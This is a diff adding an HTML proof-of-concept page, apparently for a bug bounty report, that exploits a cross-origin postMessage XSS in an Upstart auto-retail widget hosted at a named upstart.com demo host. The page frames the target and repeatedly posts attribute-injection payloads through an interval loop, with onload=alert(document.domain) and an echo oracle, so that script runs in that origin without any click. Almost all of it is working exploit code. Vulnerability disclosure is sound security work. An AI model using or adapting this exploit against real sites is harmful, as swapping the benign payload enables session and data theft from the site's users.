@@ -1,0 +1,72 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<title>Upstart widget XSS — zero-click, fires on mockwebsites-demo.upstart.com</title>
+<style>
+ body{font:14px/1.6 -apple-system,Segoe UI,Arial,sans-serif;margin:22px;max-width:960px}
+ code{background:#f2f2f2;padding:1px 5px;border-radius:3px}
+ pre{background:#f7f7f7;padding:9px;border-radius:4px;overflow-x:auto;font-size:12px}
+ #log{border:1px solid #ccc;padding:9px;background:#fafafa;font-family:ui-monospace,Menlo,monospace;font-size:12px}
+ .ok{color:#0a7d28;font-weight:700}
+ iframe.victim{width:100%;height:340px;border:2px solid #b00}
+</style>
+</head>
+<body>
+
+<h2>Upstart Auto Retail widget &mdash; cross-origin <code>postMessage</code> XSS</h2>
+<p><b>No clicking. Just load this page.</b> It frames
+<code>https://mockwebsites-demo.upstart.com</code> (an in-scope <code>*.upstart.com</code> host) and
+posts two strings to it. Upstart's own widget writes the first into <code>localStorage</code> with no
+origin check and interpolates it unescaped into an <code>&lt;iframe src="..."&gt;</code> via jQuery
+<code>.html()</code>.</p>
+<pre>postMessage('dealId:" onload=alert(document.domain) x="', '*')   // poison, no origin check
+postMessage('CLOSE_IFRAME', '*')                                 // re-render the sink immediately</pre>
+<p>This page is a plain third-party origin with no relationship to Upstart.
+<b>Normally fires in 3-5 seconds.</b> If nothing appears within ~30s, the demo host has
+rate-limited repeated loads &mdash; wait a minute and reload <i>once</i>.</p>
+
+<h3>Log</h3>
+<div id="log"></div>
+
+<h3>Victim: mockwebsites-demo.upstart.com (framed)</h3>
+<iframe class="victim" id="victim"
+        src="https://mockwebsites-demo.upstart.com/?websiteId=prodigy-lexus&pageTemplate=standalone"></iframe>
+
+<script>
+var t0 = Date.now();
+function log(m){ var d=document.getElementById('log'); d.innerHTML += '['+((Date.now()-t0)/1000).toFixed(1)+'s] '+m+'<br>'; }
+
+/* Two payloads fire together:
+   1) alert()  — visible in Firefox. Chrome/Edge suppress dialogs in cross-origin iframes
+                 (Chrome 92+), so there the alert runs but is not drawn.
+   2) top.postMessage(document.domain) — an echo oracle that works in EVERY browser and
+      proves the injected JS executed on the upstart.com origin.                            */
+var PAYLOAD_ALERT = 'dealId:" onload=alert(document.domain) x="';
+var PAYLOAD_ECHO  = 'dealId:" onload=top.postMessage(document.domain,\'*\') x="';
+
+window.addEventListener('message', function (e) {
+  if (typeof e.data === 'string' && e.data.indexOf('upstart.com') !== -1) {
+    log('<span class="ok">XSS EXECUTED on ' + e.data + ' — injected JS ran on the upstart.com origin</span>');
+  }
+});
+
+var n = 0;
+var f = document.getElementById('victim');
+log('framed the victim, waiting for Upstart\'s widget to register its message listener...');
+var id = setInterval(function () {
+  n++;
+  try {
+    f.contentWindow.postMessage(n % 2 ? PAYLOAD_ALERT : PAYLOAD_ECHO, '*');
+    f.contentWindow.postMessage('CLOSE_IFRAME', '*');
+    if (n % 4 === 1) log('posted (' + n + ')');
+  } catch (err) { log('post error: ' + err); }
+  if (n === 22 && document.getElementById('log').innerHTML.indexOf('EXECUTED') === -1) {
+    log('<b style="color:#b00">Nothing yet. The demo host rate-limits rapid repeat loads &mdash; '
+        + 'wait ~60s and reload once. It normally fires in 3-5s.</b>');
+  }
+  if (n >= 60) { clearInterval(id); log('done posting.'); }
+}, 800);
+</script>
+
+</body></html>
